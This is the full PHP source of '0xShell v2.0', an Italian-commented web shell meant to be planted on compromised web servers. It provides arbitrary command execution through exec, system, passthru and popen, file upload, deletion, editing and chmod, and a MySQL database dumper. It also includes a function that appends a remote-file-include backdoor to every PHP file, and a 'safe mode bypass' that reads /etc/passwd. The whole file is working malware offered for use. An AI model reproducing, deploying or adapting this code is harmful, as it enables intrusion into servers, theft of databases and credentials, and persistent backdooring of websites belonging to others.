<?php
/* *
 * 
 * 0xShell ~ http://0xproject.hellospace.net/#0xShell
 *
 * Autore: KinG-InFeT [ http://www.kinginfet.net/ ] , Netw0rkSecurity Team [ http://netw0rksecurity.net/ ]
 * Licenza: GPL
 * Versione: v2.0
 *
 *
 *  Release pubblicata il: 31/09/2010
 *
 *
 * */ 
 
 /* *
  *
  * CHANGELOG_
  *
  *  0xShell v2.0
  *  [+] Rivista l'intera identazione del codice
  *  [+] Aggiunta colorazione della sintassi durante la visualizzazione del codice di una pagina
  *  [+] Sistemato il Footer
  *  [+] Fixed XSS in $patch variable
  *  [+] Aggiunta possibilità di uplodare un qualsiasi file
  *  [+] Aggiunto il terminale Linux (Thanks C99 Shell)
  *  [+] Aggiunta la possibilità di Chmoddare un file o una directory tramite la funzione chmod()
  *  [+] Fixato il problema nelle informazioni ( se exec non esiste? xd)
  *  [+] Aggiunto il Dumper per i database MySQL
  *  [+] Aggiunta la funzione per inniettare codice PHP in ogni file cosìda infettarli con una RFI o altro
  *  [+] Aggiunto il controllo sui Magic Quotes
  *  [+] Aggiunto il Safe_Mode ByPass con lettura del /etc/passwd file :D
  *  [+] Identata e commentata tutta la pagina :D
  *
  *  0xShell v1.0
  *  [+] Possibilità di navigare tra i vari file e directory
  *  [+] Possibilità di eliminare file
  *  [+] Possibilità di eliminare directory
  *  [+] Possibilità di editare un file
  *  [+] Possibilità di creare una directory
  *  [+] Possibilità di visionare il phpinfo()
  *  [+] Possibilità di visualizzare il contenuto di un file
  *  [+] Possibilità di visionare i permessi su directory e file sia in stile UNIX che in stile Numerico
  *  [+] Inserite molte informazioni riguardante il server poste in alto
  *  [+] Possibilità di effettuare un whois dell'IP del server in cui risiede la shell
  *
  * */

set_time_limit(0);
error_reporting(E_ALL ^ E_NOTICE);

//versione della Shell :P
define("VERSION","2.0");

//controlla se il safe_mode è attivo oppure no
function check_safe_mode() {
	if (ini_get('safe_mode') == FALSE)
		$safemode = "<font color='green'>OFF</font>";
	else
		$safemode = "<font color='red'>ON</font>";
	return $safemode;
}

//controlla se il get_magic_quotes_gpc() è attivo oppure no
function check_magic_quotes_gpc() {
	if ((get_magic_quotes_gpc() == 1) || (get_magic_quotes_gpc() == "on"))
		$magic_quotes = "<font color='red'>ON</font>";
	else
		$magic_quotes = "<font color='green'>OFF</font>";
	return $magic_quotes;
}

//fa il controllo dei permessi e ne restituisce il valore
function get_perms($file,$type) {
	switch($type) {
		case 1;
			$mode   = fileperms($file);
			$perms .= ($mode & 00400) ? 'r' : '-';
			$perms .= ($mode & 00200) ? 'w' : '-';
			$perms .= ($mode & 00100) ? 'x' : '-';
			$perms .= ($mode & 00040) ? 'r' : '-';
			$perms .= ($mode & 00020) ? 'w' : '-';
			$perms .= ($mode & 00010) ? 'x' : '-';
			$perms .= ($mode & 00004) ? 'r' : '-';
			$perms .= ($mode & 00002) ? 'w' : '-';
			$perms .= ($mode & 00001) ? 'x' : '-';
		break;
		
		case 2;
			$perms = substr(sprintf('%o', fileperms($file)), -4);
		break;
	}
	
return $perms;
}

//delete a Directory
function del_dir($dirname) {
if(is_dir($dirname)){
		$handle = opendir($dirname);
		while (FALSE !== ($file = readdir($handle))) { 
			if(is_file($dirname.$file)){
				unlink($dirname.$file);
			}
		}
		$handle = closedir($handle);
		if(rmdir($dirname))
			return TRUE;
		else
			return FALSE;
	}else
		return FALSE;
}

//Thanks C99 Shell :P
function cmd($cmd) {
	$result = "";
	
	if (!empty($cmd)) {
		if (is_callable("exec")) {
			exec($cmd,$result); 
			$result = join("\n",$result);
		}
	elseif (($result = `$cmd`) !== FALSE) {
				//:S
			}
	elseif (is_callable("system")) {
			$v = @ob_get_contents(); 
			@ob_clean(); 
			system($cmd); 
			$result = @ob_get_contents(); 
			@ob_clean(); 
			echo $v;
		}
	elseif (is_callable("passthru")) {
			$v = @ob_get_contents(); 
			@ob_clean(); 
			passthru($cmd); 
			$result = @ob_get_contents(); 
			@ob_clean(); 
			echo $v;
		}
	elseif (is_resource($fp = popen($cmd,"r"))) {
			$result = "";
			while(!feof($fp)) {
				$result .= fread($fp,1024);
			}
			pclose($fp);
		}
	}
	return $result;
}

//dumper per il MySQL
function _mysqldump($mysql_database) {
	$sql    = "show tables;";
	$result = mysql_query($sql);
	if( $result)
	{
		while( $row = mysql_fetch_row($result))
		{
			_mysqldump_table_structure($row[0]);

			if( isset($_REQUEST['sql_table_data']))
			{
				_mysqldump_table_data($row[0]);
			}
		}
	}
	else
	{
		echo "/* no tables in $mysql_database */\n";
	}
	mysql_free_result($result);
}

function _mysqldump_table_structure($table)
{
	echo "/* Table structure for table `$table` */\n";
	if( isset($_REQUEST['sql_drop_table']))
	{
		echo "DROP TABLE IF EXISTS `$table`;\n\n";
	}
	if( isset($_REQUEST['sql_create_table']))
	{

		$sql    = "show create table `$table`; ";
		$result = mysql_query($sql);
		if( $result)
		{
			if($row= mysql_fetch_assoc($result))
		{
				echo $row['Create Table'].";\n\n";
				}
		}
		mysql_free_result($result);
	}
}

function _mysqldump_table_data($table) {

	$sql    = "select * from `$table`;";
	$result = mysql_query($sql);
	if( $result)
	{
		$num_rows   = mysql_num_rows($result);
		$num_fields = mysql_num_fields($result);

		if( $num_rows > 0)
		{
			echo "/* dumping data for table `$table` */\n";

			$field_type=array();
			$i=0;
			while( $i < $num_fields)
			{
				$meta = mysql_fetch_field($result, $i);
				array_push($field_type, $meta->type);
				$i++;
			}

			echo "insert into `$table` values\n";
			$index = 0;
			while( $row = mysql_fetch_row($result))
			{
				echo "(";
				for( $i=0; $i < $num_fields; $i++)
				{
					if( is_null( $row[$i]))
						echo "null";
					else
					{
						switch( $field_type[$i])
						{
							case 'int':
								echo $row[$i];
							break;
							case 'string':
							case 'blob' :
							default:
								echo "'".mysql_real_escape_string($row[$i])."'";
						}
					}
					if( $i < $num_fields-1)
						echo ",";
				}
				echo ")";
						if( $index < $num_rows-1)
					echo ",";
				else
					echo ";";
				echo "\n";

				$index++;
			}
		}
	}
	mysql_free_result($result);
	echo "\n";
}

//test per la connessione al MySQL
function _mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password) {
	global $output_messages;
	
	$link = mysql_connect($mysql_host, $mysql_username, $mysql_password);
	if (!$link) {
	   array_push($output_messages, 'Could not connect: ' . mysql_error());
	}else{
		array_push ($output_messages,"Connected with MySQL server:$mysql_username@$mysql_host successfully");
		
		$db_selected = mysql_select_db($mysql_database, $link);
		if (!$db_selected)
			array_push ($output_messages,'Can\'t use $mysql_database : ' . mysql_error());
		else
			array_push ($output_messages,"Connected with MySQL database:$mysql_database successfully");
	}

}

//Infetta tutti i file :P
function infect_all_files($code_infect) {

	foreach (glob("*.php") as $file) {
		$dir  = '.';
		$open = fopen($file, 'a+');
		@fwrite($open, $code_infect);
		@fclose($open);
	}
	if($open)
		$text = '<font size=1 face=Verdana color=lightgreen>Infected!</font>';
	else
		$text = '<font size=1 face=Verdana color=red>Error (Bad Perms?)</font>';
	return $text;
}

//funcione per il safe_mode_bypass (lettura del /etc/passwd file :P
function safe_mode_bypass($file) {
	$test  = '';
	$tempp = tempnam($test, "cx");
	$get   = htmlspecialchars($file);
	if(copy("compress.zlib://".$get, $tempp)){
		$fopenzo = fopen($tempp, "r");
		$freadz  = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		echo "<center><font size='1' face='Verdana'>".$get."</font><br><textarea rows='20' cols='80' name='source'>".$source."</textarea></center>";
		unlink($tempp);
	} else {
		echo "<center><font size='1' color='red' face='Verdana'>Error</font></center>";
	}
}

//funzione per il settaggio dei permessi (CHMOD)
function chmod_shell($file, $perms) {
	@$var = fopen($file,'w') or die("Error! Impossibile aprire il File");
	
	$check = @chmod($file, $perms);
	
	if($check == TRUE)
		$control = "<center><font size='1' color='green' face='Verdana'>chmodded!</font></center>";
	else
		$control = "<center><font size='1' color='red' face='Verdana'>ERROR</font></center>";
		
	@fclose($var); 
	
	return $control;
}	

$print_form      = 1;
$output_messages = array();

$patch       = htmlspecialchars($_SERVER['PHP_SELF']);
$dir         = $_GET['dir'];
$remove_file = $_GET['remove_file'];
$view_file   = $_GET['view_file'];
$edit_file   = $_GET['edit_file'];
$rmdir       = $_GET['rmdir'];
$action      = $_GET['action'];
$cmd         = $_REQUEST['cmd'];

?>
<html>
<head>
<title>0xShell v <?php echo VERSION; ?></title>
<style type="text/css">
table {
	background-color: #000000;
	color: #FFFFFF;
	font-family: verdana;
	font-size: 10px;
	cursor: default;
	border-spacing: 1px;
	margin-left: auto;
	margin-right: auto;
	width: 900px;
	border-width: 1px;
	border:1px solid #333;
	padding: 10px;
}

input,textarea,select {
	font: normal 11px Verdana, Arial, Helvetica, sans-serif;
	background-color:black;
	color:#a6a6a6;
	border: solid 1px #363636;
}

a:link,a:visited,a:active {
	font-family: verdana;
	font-size: 10px;
	text-decoration: none;
	color: #FFFFFF;
	cursor: default;
}

pre {
	background-color: #666666;
	text-align: left;
	padding: 10px;
}

a:hover{
	color: #D3D3D3;
}
</style>
</head>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<h2 align="center"><code><a href="<?php echo $patch; ?>"><font size="4">[~]</font></a> 0xShell v <?php echo VERSION; ?><blink>_</blink></code></h2>      

</div><br />
<table>
<tr><td>[~] Uname -a: <u><?php echo php_uname("a"); ?></u></td></tr>
<tr><td>[~] Kernel Version: <u><?php echo php_uname("r"); ?></u></td></tr>
<tr><td>[~] Server Address: <u> <?php echo $_SERVER['SERVER_ADDR']; ?></u></td></tr>
<tr><td>[~] Whois Server: <?php echo "<a href='http://whois.domaintools.com/".$_SERVER['SERVER_ADDR']."'>Click Here</a>"; ?></td></tr>
<tr><td>[~] Server Name: <u><?php echo $_SERVER['SERVER_NAME']; ?></u></td></tr>
<tr><td>[~] Server Software: <u><?php echo $_SERVER['SERVER_SOFTWARE']; ?></u></td></tr>
<tr><td>[~] Charset: <u> <?php echo $_SERVER['HTTP_ACCEPT_CHARSET']; ?></u></td></tr>
<tr><td>[~] IP Address: <u><?php echo $_SERVER['REMOTE_ADDR']; ?></u></td></tr>
<tr><td>[~] User Agent: <u><?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?></u></td></tr>
<tr><td>[~] Patch: <u><?php echo $_SERVER['DOCUMENT_ROOT']; ?></u></td></tr>
<tr><td>[~] Safe Mode: <?php echo check_safe_mode(); ?></td></tr>
<tr><td>[~] Magic Quotes GPC: <?php echo check_magic_quotes_gpc(); ?></td></tr>
</table>
<p></p>
<div align="center">
<!-- menu -->
-
<a href="?" >[File Manager]</a> - 
<a href="?action=phpinfo" >[PHP-Info]</a> - 
<a href="?action=mkdir" >[Crea Directory]</a> - 
<a href="?action=chmod" >[CHMOD]</a> - 
<a href="?action=upload" >[Upload]</a> - 
<a href="?action=terminal" >[Terminal]</a> - 
<a href="?action=mysql_dump" >[MySQL Dumper]</a> - 
<a href="?action=infect_all_file" >[Infect All Files]</a> - 
<a href="?action=safe_mode_bypass" >[Safe Mode ByPass]</a> - 
<!-- end menu -->
<br /><br /><br />
<div align="center">
<?php
switch($action) {//varie azioni
	case 'phpinfo'; //visualizzo in phpinfo()
		die(phpinfo());
	break;
	
	case 'mkdir';//crea una directory
		echo "<form method=\"POST\" action=\"".$patch."?action=mkdir&work=ok\" />\n";
		echo "Directory Name: <input type='test' name='dir_name' /><br />\n";
		echo "<input type='submit' value='Create' /></form>";
		if(@$_GET['work'] == 'ok') {
			if(mkdir($_POST['dir_name']))
				echo "<script>alert('Directory Created'); window.location=\"".$patch."\";</script>";
			else
				echo "<script>alert('Directory Not Created'); window.location=\"".$patch."\";</script>";
		}
	break;
	
	case 'terminal':	
		print "<form method=\"POST\" action=\"".$patch."?action=terminal\" />"
		. "Command: <input type=\"text\" name=\"cmd\" />"
		. "<input type=\"submit\" name=\"submit\" value=\"Send\" />";
		
		if($_POST['submit']) {
			$ret  = cmd($cmd);
			$ret  = convert_cyr_string($ret,"d","w");
			$rows = count(explode("\r\n",$ret)) + 1;
			if ($rows < 10)
				$rows = 20;
			echo "<br /><br /><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
		}
	break;
	
	case 'upload':
		print "\n<form method=\"POST\" action=\"".$patch."?action=upload\" enctype=\"multipart/form-data\">\n"
		    . "<input type=\"file\" name=\"miofile\"><br /><br />\n"
		    . "<input type=\"submit\" name=\"send_upload\" value=\"Upload\">\n"
		    . "</form>\n";
		    
		 if(@$_POST['send_upload']) {
		 
		    $percorso = $_FILES['miofile']['tmp_name'];
		    $nome     = $_FILES['miofile']['name'];
		    
		    if (move_uploaded_file($percorso, $dir . $nome))
		        print "Upload eseguito con successo";
		    else
		        print "Errore! Upload del file non eseguito correttamente riprovare...";
		}
	break;
	
	case 'mysql_dump':
	
		if( isset($_REQUEST['action']) )
		{
			$mysql_host     = $_REQUEST['mysql_host'];
			$mysql_database = $_REQUEST['mysql_database'];
			$mysql_username = $_REQUEST['mysql_username'];
			$mysql_password = $_REQUEST['mysql_password'];
		
			if( 'Test Connection' == $_REQUEST['action'])
			{
				_mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password);
			}
			else if( 'Export' == $_REQUEST['action'])
			{
				_mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password);
				if( 'SQL' == $_REQUEST['output_format'] )
				{
					$print_form = 0;
		
					header('Content-type: text/plain');
					header('Content-Disposition: attachment; filename="'.$mysql_host."_".$mysql_database.'_.sql"');
					echo "/*MySQL-Dumper 0xShell*/\n";
					_mysqldump($mysql_database);
				}
			}
		
		}
		
		if( $print_form >0 )
		{
		?>
		
		<body>
		<?php
			foreach ($output_messages as $message)
			{
		    	echo $message."<br />";
			}
		?>
		<form action="<?php echo $patch."?action=mysql_dump"; ?>" method="POST">
		MySQL connection parameters:
		<table border="0">
		  <tr>
		    <td>Host:</td>
		    <td><input  name="mysql_host" value="<?php if(isset($_REQUEST['mysql_host'])) echo $_REQUEST['mysql_host']; else echo 'localhost';?>"  /></td>
		  </tr>
		  <tr>
		    <td>Database:</td>
		    <td><input  name="mysql_database" value="<?php echo @$_REQUEST['mysql_database']; ?>"  /></td>
		  </tr>
		  <tr>
		    <td>Username:</td>
		    <td><input  name="mysql_username" value="<?php echo @$_REQUEST['mysql_username']; ?>"  /></td>
		  </tr>
			  <tr>
		    <td>Password:</td>
		    <td><input  type="password" name="mysql_password" value="<?php echo @$_REQUEST['mysql_password']; ?>"  /></td>
		  </tr>
		  <tr>
	    <td>Output format: </td>
		    <td>
		      <select name="output_format" >
		        <option value="SQL" <?php if( isset($_REQUEST['output_format']) && 'SQL' == $_REQUEST['output_format']) echo "selected";?> >SQL</option>
		        <option value="CSV" <?php if( isset($_REQUEST['output_format']) && 'CSV' == $_REQUEST['output_format']) echo "selected";?> >CSV</option>
		        </select>
		    </td>
		  </tr>
	</table>
		<input type="submit" name="action"  value="Test Connection"><br />
		  <br>Dump options(SQL):
		  <table border="0">
		    <tr>
		      <td>Drop table statement: </td>
		      <td><input type="checkbox" name="sql_drop_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_drop_table'])) ; else echo 'checked' ?> /></td>
			    </tr>
		    <tr>
		      <td>Create table statement: </td>
		      <td><input type="checkbox" name="sql_create_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_create_table'])) ; else echo 'checked' ?> /></td>
		    </tr>
		    <tr>
		      <td>Table data: </td>
		      <td><input type="checkbox" name="sql_table_data"  <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_table_data'])) ; else echo 'checked' ?>/></td>
		    </tr>
		  </table>
		<input type="submit" name="action"  value="Export"><br />
		</form>
		<?php
		}
		break;
		
		case 'infect_all_file':
			if($_GET['inject']) {
				infect_all_files($_POST['code_infect']);
			}else{
				print "<form method='post' action='".$patch."?action=infect_all_file'>\n"
					. "<textarea name='cod3inf' cols=50 rows=4>\n"
					. "<?php include(\$GET['rfi']); ?>\n"
					. "</textarea>\n"
					. "<br /><input type='submit' value='Infect All Files!' name='inf3ct'><br />\n";
			}
		break;
		
		case 'safe_mode_bypass':
			print "<form action='".$patch."?action=safe_mode_bypass' method='POST'>\n"
				. "File Name: <input type='text' name='filew' value='/etc/passwd'><br />\n"
				. "<input type='submit' value='Read File' name='red_file'>\n"
				. "</form>\n";
			if(isSet($_POST['red_file'])) {
				safe_mode_bypass($_POST['filew']);
			}
		break;
		
		case 'chmod':
			print "<form action='".$patch."?action=chmod' method='POST'>\n"
				. "File: <input type=\"text\" name=\"file\" value=\"".htmlspecialchars($_GET['file'])."\" /><br />\n"
			    . "Perms Value: <input type='text' name='perms' value='".$_GET['perms']."'><br />\n"
			    . "<input type='submit' value='Edit CHMOD' name='chmod_edit'>\n"
				. "</form>\n";
			if(isSet($_POST['chmod_edit'])) {
				print chmod_shell($_POST['file'], $_POST['perms']);
			}
		break;
				
}

if(isset($remove_file)) {  //Rimozione file

	if(!(is_writable($remove_file)))
		die("File Not Deleted");
		
	if(unlink($remove_file))
		echo "<script>alert('File Deleted'); location.href='$patch';</script>";
	else
		echo "<script>alert('File Not Deleted'); location.href='$patch';</script>";
}

if(isset($view_file)) {  //view file
	if(!(is_readable($view_file))) {
		die("File Not View");
	}else{
		echo "<b>View File: ".$view_file."</b><br />\n";
		echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #c0c0c0; text-align: left;\">\n";
		echo highlight_file($view_file)."\n</div>\n";
	}
}

if(isset($edit_file)) {  //editing file :D

	if(!(is_writable($edit_file)))
		die("File Not Writable");
		
	$text = htmlspecialchars(join(file($edit_file)));

	echo "<center>";
	echo "<form method=\"POST\" action=\"$file?edit_file=$edit_file&work=yes \">";
	echo "<textarea rows=\"30\" cols=\"150\" name=\"text\">$text</textarea>";
	echo "<br><input type=\"submit\" value=\"Edit File\">";
	echo "</form></center>";
	if(@$_GET['work'] == 'yes') {
		if(file_exists($edit_file)) {
			$edit     = fopen($edit_file,'w+');
			$new_text = stripslashes($_POST['text']);
			fwrite($edit,$new_text);
			fclose($edit);
			print "<script>alert(\"File Edited Seccess\"); window.location=\"".$patch."\";</script>";
		}
	}
}

if(isset($rmdir)) {  //delete directory
	$rmdir = $rmdir."/";
	if(del_dir($rmdir) == TRUE)
		die("<script>alert('Directory Deleted'); window.location=\"".$patch."\";</script>");
	else
		die("<script>alert('Directory Created'); window.location=\"".$patch."\";</script>");
}
?>
</div>
</div>
<table>
<tr><td>File/Directory</td>
<td>Remove?</td>
<td>View?</td>
<td>Edit?</td>
<td>Permess</td></tr>
<tr><td><hr></td>
<td><hr></td>
<td><hr></td>
<td><hr></td>
<td><hr></td></tr>
<?php
if(isset($dir)) 
	chdir($dir);
echo "<tr><td><a href=\"".$patch."?dir=".htmlspecialchars($_GET['dir'])."/..\">..</a></td></tr>\n";
foreach (glob("*") as $file) {
	$perms_unix = get_perms($file,1);
	$perms_num  = get_perms($file,2);

	if(is_file($file)) {
		if(isset($dir)) {
   			echo "<tr><td><a href=".$dir."/".$patchs.">".$file."</a></td>\n";
			echo "<td><a href=".$patch."?remove_file=".$dir."/".$file.">Remove</a></td>\n";
			echo "<td><a href=".$patch."?view_file=".$dir."/".$file.">View</a></td>\n";
			echo "<td><a href=".$patch."?edit_file=".$dir."/".$file.">Edit</a></td>\n";
			echo "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." /~/ ".$perms_num."</a></u></td></tr>\n";
		}else{
			echo "<tr><td><a href=".$file.">".$file."</a></td>\n";
			echo "<td><a href=".$patch."?remove_file=".$file.">Remove</a></td>\n";
			echo "<td><a href=".$patch."?view_file=".$file.">View</a></td>\n";
			echo "<td><a href=".$patch."?edit_file=".$file.">Edit</a></td>\n";
			echo "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." /~/ ".$perms_num."</a></u></td></tr>\n";
		}
	}

	if(is_dir($file)) {
		if(isset($dir)) {
			echo "<tr><td><a href=".$file.">".$file."</td>\n";
			echo "<td><a href=".$patch."?rmdir=".$dir."/".$file.">Remove</a></td>\n";
			echo "<td><a href=".$patch."?dir=".$dir."/".$file."><u>DIR</u></td><td>Directory</td>\n";
			echo "<td>".$perms_unix." /~/ ".$perms_num."</td></tr>\n";
		}else{
			echo "<tr><td><a href=".$file.">".$file."</a></td>\n";
			echo "<td><a href=".$patch."?rmdir=".$file.">Remove</a></td>\n";
			echo "<td><a href=".$patch."?dir=".$file."><u>DIR</u></td><td>Directory</td>\n";
			echo "<td>".$perms_unix." /~/ ".$perms_num."</td></tr>\n";
		}
	}
}
   echo "</table>";
   ?>
   <br />
   <table>
   <tr>
<td valign='top'>
<center>
<b><font size='1'>[ ~ Powered by <a href='http://www.kinginfet.net/'><i>KinG-InFeT</i></a> && <a href="http://netw0rksecurity.net/"><i>Netw0rkSecurity Team</i></a> - <a href="http://0xproject.hellospace.net/#0xShell"><u>0xShell</u></a> v<?php echo VERSION; ?> ~ ]</b>
</font>
</center>
</td>
</tr>
</table>
</body>
</html>
